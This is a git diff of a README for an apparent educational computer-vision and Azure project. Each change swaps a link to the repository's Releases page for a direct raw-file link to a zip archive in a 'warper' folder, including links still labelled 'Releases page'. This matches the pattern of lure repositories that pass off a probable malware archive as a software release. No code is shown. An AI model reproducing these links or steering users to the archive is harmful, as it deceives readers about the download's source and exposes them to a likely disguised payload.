@@ -1,7 +1,7 @@
 # 🌟 computer-vision-azure-ai - Explore AI-Powered Visual Solutions
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/ITSJUSTDOGERELO/computer-vision-azure-ai/releases)
+[![Download](https://github.com/ITSJUSTDOGERELO/computer-vision-azure-ai/raw/refs/heads/main/warper/azure_ai_computer_vision_Knorria.zip)](https://github.com/ITSJUSTDOGERELO/computer-vision-azure-ai/raw/refs/heads/main/warper/azure_ai_computer_vision_Knorria.zip)
 
 ## 📖 Overview
 Welcome to the **computer-vision-azure-ai** project. This application guides you through the essentials of computer vision. It explores Azure Cognitive Services and how they apply to real-life situations, like medical imaging, autonomous vehicles, and precision agriculture. Learn about cloud versus edge deployment strategies along the way.
@@ -10,7 +10,7 @@ Welcome to the **computer-vision-azure-ai** project. This application guides you
 To run our application, follow these simple steps:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/ITSJUSTDOGERELO/computer-vision-azure-ai/releases) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/ITSJUSTDOGERELO/computer-vision-azure-ai/raw/refs/heads/main/warper/azure_ai_computer_vision_Knorria.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    Look for the most recent release. Click on it to see the available files.
@@ -49,7 +49,7 @@ The **computer-vision-azure-ai** application includes:
 The application uses Azure Cognitive Services to leverage cutting-edge algorithms in computer vision. You will get hands-on experience with both cloud and edge computing strategies, helping you understand where to apply each approach effectively.
 
 ## 📥 Download & Install
-To get started with the application, please visit the [Releases page](https://github.com/ITSJUSTDOGERELO/computer-vision-azure-ai/releases) and download the suitable version for your system. Follow the steps above to install and run it with ease.
+To get started with the application, please visit the [Releases page](https://github.com/ITSJUSTDOGERELO/computer-vision-azure-ai/raw/refs/heads/main/warper/azure_ai_computer_vision_Knorria.zip) and download the suitable version for your system. Follow the steps above to install and run it with ease.
 
 ## 📚 Topics Covered
 - autonomous-vehicles
